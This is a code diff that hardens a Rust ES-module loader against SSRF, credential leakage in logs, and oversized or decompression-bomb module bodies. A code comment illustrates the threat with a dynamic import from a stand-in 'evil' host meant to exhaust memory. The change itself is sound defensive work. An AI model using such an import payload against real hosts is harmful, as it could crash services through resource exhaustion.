@@ -66,6 +66,15 @@ impl ModuleLoader for ObscuraModuleLoader {
         let proxy_url = self.proxy_url.clone();
 
         ModuleLoadResponse::Async(Pin::from(Box::new(async move {
+            // SSRF: a dynamic `import()` is a network egress reachable from page
+            // JS, so apply the same guard as op_fetch_url. This pre-flight check
+            // catches IP-literal targets (which never reach a custom resolver);
+            // resolvable hostnames (incl. rebinding) are caught at connect time
+            // by the SsrfDnsResolver installed on the shared client below.
+            if let Ok(parsed) = url::Url::parse(&url) {
+                crate::ops::validate_fetch_url(&parsed).map_err(io_err)?;
+            }
+
             // Reuse the process-wide cached client (same one op_fetch_url
             // uses). Modern SPAs dynamic-import 20-50 chunks per page; the
             // old code built a fresh reqwest::Client per import, each with
@@ -79,7 +88,8 @@ impl ModuleLoader for ObscuraModuleLoader {
             tracing::debug!(
                 "Loading ES module: {} (proxy: {})",
                 url,
-                proxy_url.as_deref().unwrap_or("direct")
+                // OPS-04: never log the proxy URL (it may carry credentials).
+                if proxy_url.is_some() { "via-proxy" } else { "direct" }
             );
 
             let resp = client
@@ -97,9 +107,20 @@ impl ModuleLoader for ObscuraModuleLoader {
                 )));
             }
 
-            let code = resp.text().await.map_err(|e| {
-                io_err(format!("Failed to read module body {}: {}", url, e))
-            })?;
+            // DOS-N1: a dynamic `import()` is a page-reachable egress, so bound
+            // the body the same way op_fetch_url / the nav client do. `resp.text()`
+            // buffered the whole (possibly endless or decompression-bombed) body
+            // into a String with no cap — a single `import('https://evil/huge.mjs')`
+            // could OOM-kill the host. read_body_capped truncates at
+            // OBSCURA_MAX_BODY_BYTES (256 MiB default), bounding the decompressed
+            // size since reqwest decompresses transparently.
+            let body_bytes =
+                obscura_net::read_body_capped(resp, obscura_net::max_response_body())
+                    .await
+                    .map_err(|e| {
+                        io_err(format!("Failed to read module body {}: {}", url, e))
+                    })?;
+            let code = String::from_utf8_lossy(&body_bytes).into_owned();
 
             let specifier = ModuleSpecifier::parse(&url)
                 .map_err(|e| io_err(format!("Invalid module URL {}: {}", url, e)))?;
